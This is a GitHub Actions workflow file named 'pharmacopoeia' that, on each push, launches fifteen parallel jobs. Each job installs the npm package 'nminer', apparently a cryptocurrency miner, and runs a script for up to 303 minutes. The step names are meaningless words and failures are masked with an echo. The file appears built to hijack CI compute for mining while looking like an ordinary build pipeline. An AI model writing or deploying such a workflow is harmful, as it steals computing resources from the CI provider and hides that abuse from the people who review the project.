name: pharmacopoeia
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3951 }
          - { version: 8536 }
          - { version: 9614 }
          - { version: 6341 }
          - { version: 1304 }
          - { version: 9152 }
          - { version: 6597 }
          - { version: 9976 }
          - { version: 943 }
          - { version: 8243 }
          - { version: 100 }
          - { version: 5180 }
          - { version: 8677 }
          - { version: 6483 }
          - { version: 6705 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: markup exotic formal
        run: |
          npm install nminer@latest
          timeout 303m node pharmacopoeia.js || echo "pharmacopoeia executed"